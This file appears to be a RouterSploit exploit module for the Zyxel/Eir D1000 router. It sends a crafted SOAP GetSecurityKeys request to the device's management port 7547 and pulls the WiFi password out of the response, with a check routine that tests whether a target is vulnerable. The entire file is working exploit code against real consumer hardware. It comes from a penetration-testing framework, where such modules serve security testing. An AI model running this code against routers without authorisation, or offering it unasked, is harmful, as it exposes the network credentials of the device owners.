import re

from routersploit import (
    exploits,
    print_error,
    print_success,
    http_request,
    mute,
    validators,
    print_table,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Zyxel/Eir D1000 Password Disclosure vulnerability.
    If the target is vulnerable it allows to read WiFi password.
    """
    __info__ = {
        'name': 'Zyxel Eir D1000 WiFi Password Disclosure',
        'description': 'Module exploits WiFi Password Disclosure vulnerability in Zyxel/Eir D1000 devices.'
                       'If the target is vulnerable it allows to read WiFi password.',
        'authors': [
            'Xiphos http://www.xiphosresearch.com/',  # vulnerability discovery, poc exploit
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://github.com/XiphosResearch/exploits/tree/master/tr-06fail',
        ],
        'devices': [
            'Zyxel EIR D1000',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(7547, 'Target port')  # default port

    def run(self):
        creds = []
        password = self.get_wifi_key()

        if password is not None:
            creds.append(("WiFi Password", password))
            print_success("Target seems to be vulnerable")
            print_table(("Parameter", "Value"), *creds)
        else:
            print_error("Target seems to be not vulnerable")

    @mute
    def check(self):
        if self.get_wifi_key() is not None:
            return True  # target is vulnerable

        return False  # target is not vulnerable

    def get_wifi_key(self):
        url = "{}:{}/UD/act?1".format(self.target, self.port)

        headers = {"SOAPAction": "urn:dslforum-org:service:WLANConfiguration:1#GetSecurityKeys"}
        data = ("<?xml version=\"1.0\"?>"
                "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
                " <SOAP-ENV:Body>"
                "  <u:GetSecurityKeys xmlns:u=\"urn:dslforum-org:service:WLANConfiguration:1\">"
                "  </u:GetSecurityKeys>"
                " </SOAP-ENV:Body>"
                "</SOAP-ENV:Envelope>")

        response = http_request(method="POST", url=url, headers=headers, data=data)
        if response is None:
            return None

        password = re.findall("<NewPreSharedKey>(.*?)</NewPreSharedKey>", response.text)

        if len(password):
            return password[0]

        return None
